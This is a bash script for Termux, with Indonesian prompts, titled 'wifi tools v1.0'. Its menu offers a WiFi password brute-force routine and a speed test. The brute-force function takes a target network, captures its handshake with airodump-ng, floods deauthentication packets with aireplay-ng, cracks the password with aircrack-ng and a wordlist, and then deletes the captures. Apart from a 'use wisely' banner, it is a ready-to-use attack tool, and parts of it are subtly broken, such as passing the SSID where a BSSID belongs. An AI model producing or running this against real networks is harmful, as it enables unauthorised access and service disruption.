#!/data/data/com.termux/files/usr/bin/bash

# ewekan
RED='\033[1;91m'
GREEN='\033[1;92m'
YELLOW='\033[1;93m'
BLUE='\033[1;94m'
PURPLE='\033[1;95m'
CYAN='\033[1;96m'
WHITE='\033[1;97m'
BG_RED='\033[1;41m'
BG_GREEN='\033[1;42m'
BG_BLUE='\033[1;44m'
NC='\033[0m'


bruteforce_wifi() {
    clear
    echo -e "${BLUE}"
    echo "╔══════════════════════════════════════╗"
    echo "║          BRUTEFORCE TOOLS         ║"
    echo "╚══════════════════════════════════════╝${NC}"
    echo ""
    
    echo -e "${BG_RED}${WHITE}⚠ GUNAKAN DENGAN BIJAK YA BRO  ⚠${NC}"
    echo -e "${YELLOW}============================================${NC}"
    echo ""
    
    read -p "$(echo -e '${CYAN}[?]${NC} Masukkan nama WiFi: ')" ssid
    read -p "$(echo -e '${CYAN}[?]${NC} Masukkan path ke wordlist: ')" wordlist
    read -p "$(echo -e '${CYAN}[?]${NC} Masukkan interface network (contoh: wlan0): ')" interface

    echo ""
    echo -e "${PURPLE}╔══════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║          PROSES BRUTEFORCE            ║${NC}"
    echo -e "${PURPLE}╚══════════════════════════════════════╝${NC}"
    echo -e "${GREEN}[*]${NC} Target: ${WHITE}$ssid${NC}"
    echo -e "${GREEN}[*]${NC} Interface: ${WHITE}$interface${NC}"
    echo -e "${GREEN}[*]${NC} Wordlist: ${WHITE}$wordlist${NC}"
    echo ""
    
    
    echo -ne "${YELLOW}["
    for i in {1..30}; do
        echo -ne "#"
        sleep 0.05
    done
    echo -ne "]${NC}"
    echo ""
    
    echo "mulai bruteforce ke $ssid..."

    # di ewekan lgi biar crot
    echo -e "${CYAN}[1]${NC} Capturing handshake..."
    airodump-ng $interface --bssid $ssid -w capture &
    sleep 5
    echo -e "${CYAN}[2]${NC} Sending deauth packets..."
    aireplay-ng --deauth 10 -a $ssid $interface

   
    echo -e "${CYAN}[3]${NC} memulai brute-force attack"
    aircrack-ng -w $wordlist -b $ssid capture*.cap
    
    echo ""
    echo -e "${GREEN}[✓]${NC} membersihkan up..."
    rm capture*.cap
    
    echo -e "\n${BG_GREEN}${WHITE}═══════════ SELESAI ═══════════${NC}"
}


test_wifi_speed() {
    clear
    echo -e "${BLUE}"
    echo "╔══════════════════════════════════════╗"
    echo "║          SPEED TEST MODE          ║"
    echo "╚══════════════════════════════════════╝${NC}"
    echo ""
    
    read -p "$(echo -e '${CYAN}[?]${NC} masukkan nama wifi: ')" ssid
    
    echo ""
    echo -e "${PURPLE}╔══════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║       TESTER KECEPATAN WIFI         ║${NC}"
    echo -e "${PURPLE}╚══════════════════════════════════════╝${NC}"
    echo -e "${GREEN}[*]${NC} target: ${WHITE}$ssid${NC}"
    echo ""
    
    echo "mulai tes kecepatan wifi ke $ssid..."
    echo ""
    
   
    echo -ne "${YELLOW}["
    for i in {1..20}; do
        echo -ne "▓"
        sleep 0.1
    done
    echo -ne "]${NC}"
    echo ""
    
   
    echo -e "${CYAN}══════════ HASIL SPEEDTEST ══════════${NC}"
    speedtest-cli
    echo -e "${CYAN}══════════════════════════════════════${NC}"
}


while true; do
    clear
    
    
    echo -e "${PURPLE}"
    echo "╔══════════════════════════════════════════════════╗"
    echo "║                                                  ║"
    echo "║  ██╗    ██╗██╗███████╗██╗  ██╗███████╗██╗       ║"
    echo "║  ██║    ██║██║██╔════╝██║  ██║██╔════╝██║       ║"
    echo "║  ██║ █╗ ██║██║█████╗  ███████║█████╗  ██║       ║"
    echo "║  ██║███╗██║██║██╔══╝  ██╔══██║██╔══╝  ██║       ║"
    echo "║  ╚███╔███╔╝██║██║     ██║  ██║███████╗███████╗  ║"
    echo "║   ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝  ║"
    echo "║                                                  ║"
    echo "║            wifi tools v1.0                 ║"
    echo "║           created by: irfan                     ║"
    echo "╚══════════════════════════════════════════════════╝${NC}"
    echo ""
    
    
    echo -e "${BG_RED}${WHITE}  PAKE DENGAN BIJAK DAN TANGGUNG JAWAB  ${NC}"
    echo ""
    
   
    echo -e "${CYAN}╔════════════════════ MENU ═══════════════════╗${NC}"
    echo -e "${CYAN}║                                                ║${NC}"
    echo -e "${CYAN}║  ${GREEN}[1]${WHITE}  brute-force ( password )                   ${CYAN}║${NC}"
    echo -e "${CYAN}║  ${GREEN}[2]${WHITE}  speed-test ( test kecepatan wifi )                   ${CYAN}║${NC}"
    echo -e "${CYAN}║  ${GREEN}[3]${WHITE}  keluar                             ${CYAN}║${NC}"
    echo -e "${CYAN}║                                                ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
    echo ""
    
    echo -ne "${YELLOW}┌─[${GREEN}WiFi-Tools${YELLOW}]${NC}"
    echo -ne "${WHITE}[${RED}root${WHITE}]${NC}"
    echo -e "${YELLOW}─[${BLUE}Pilih 1-3${YELLOW}]${NC}"
    echo -ne "${PURPLE}└──╼${NC} ${WHITE}\$${NC} "
    read -p "" choice

    case $choice in
        1)
            bruteforce_wifi
            ;;
        2)
            test_wifi_speed
            ;;
        3)
            clear
            echo -e "${BLUE}"
            echo "╔══════════════════════════════════════╗"
            echo "║         MAKASIH UDH PAKE TOOLS IRFAN              ║"
            echo "╚══════════════════════════════════════╝${NC}"
            echo ""
            echo -e "${GREEN}[✓]${NC} makasih udh pake tools irfan"
            echo -e "${YELLOW}[*]${NC} jangan pake sembarang ya thanks"
            echo ""
            echo -e "${CYAN}══════════════════════════════════════${NC}"
            sleep 2
            exit 0
            ;;
        *)
            echo ""
            echo -e "${RED}╔══════════════════════════════════════╗${NC}"
            echo -e "${RED}║    PILIHAN GA VALID          ║${NC}"
            echo -e "${RED}╚══════════════════════════════════════╝${NC}"
            echo -e "${YELLOW}[!]${NC}  pilih 1, 2, atau 3 aja bre"
            sleep 2
            ;;
    esac

    echo ""
    echo -e "${CYAN}══════════════════════════════════════${NC}"
    echo -ne "${YELLOW}[?]${NC} klick enter buat ke menu utama bre"
    read -p ""
done
